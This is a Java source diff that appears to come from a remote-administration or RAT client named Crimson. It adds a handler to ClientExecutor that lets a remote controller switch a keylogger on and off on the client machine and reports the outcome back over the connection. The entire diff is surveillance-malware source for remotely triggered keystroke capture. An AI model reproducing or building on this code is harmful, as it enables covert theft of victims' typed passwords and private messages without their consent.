@@ -17,6 +17,7 @@
  *****************************************************************************/
 package com.subterranean_security.crimson.client.net;
 
+import java.awt.HeadlessException;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.IOException;
@@ -25,12 +26,14 @@ import java.util.concurrent.TimeUnit;
 import javax.imageio.ImageIO;
 import javax.security.auth.DestroyFailedException;
 
+import org.jnativehook.NativeHookException;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.google.protobuf.ByteString;
 import com.subterranean_security.crimson.client.Client;
 import com.subterranean_security.crimson.client.ClientStore;
+import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.modules.QuickScreenshot;
 import com.subterranean_security.crimson.client.stream.CInfoSlave;
 import com.subterranean_security.crimson.core.Common;
@@ -46,10 +49,13 @@ import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileListing;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_Delete;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_FileHandle;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
+import com.subterranean_security.crimson.core.proto.Keylogger.RS_KeyloggerStateChange;
+import com.subterranean_security.crimson.core.proto.Keylogger.State;
 import com.subterranean_security.crimson.core.proto.Log.LogFile;
 import com.subterranean_security.crimson.core.proto.Log.LogType;
 import com.subterranean_security.crimson.core.proto.Log.RS_Logs;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
+import com.subterranean_security.crimson.core.proto.Misc.Outcome;
 import com.subterranean_security.crimson.core.proto.Screenshot.RS_QuickScreenshot;
 import com.subterranean_security.crimson.core.proto.Stream.Param;
 import com.subterranean_security.crimson.core.proto.Update.RS_GetClientConfig;
@@ -129,6 +135,8 @@ public class ClientExecutor extends BasicExecutor {
 						rq_delete(m);
 					} else if (m.hasRqLogs()) {
 						rq_logs(m);
+					} else if (m.hasRqKeyloggerStateChange()) {
+						rq_keylogger_state_changed(m);
 					} else {
 						connector.cq.put(m.getId(), m);
 					}
@@ -379,6 +387,26 @@ public class ClientExecutor extends BasicExecutor {
 		}
 		ClientStore.Connections
 				.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid).setRsLogs(rs));
+	}
+
+	private void rq_keylogger_state_changed(Message m) {
+		Outcome.Builder outcome = Outcome.newBuilder();
+		if (m.getRqKeyloggerStateChange().getNewState() == State.ONLINE) {
+			try {
+				Keylogger.start(Client.ic.getKeyloggerFlushMethod(), Client.ic.getKeyloggerFlushValue());
+				outcome.setResult(true);
+			} catch (HeadlessException e) {
+				outcome.setResult(false).setComment("HeadlessException");
+			} catch (NativeHookException e) {
+				outcome.setResult(false).setComment(e.getMessage());
+			}
+		} else {
+			Keylogger.stop();
+			outcome.setResult(true);
+		}
+
+		ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
+				.setRsKeyloggerStateChange(RS_KeyloggerStateChange.newBuilder().setResult(outcome)));
 	}
 
 }
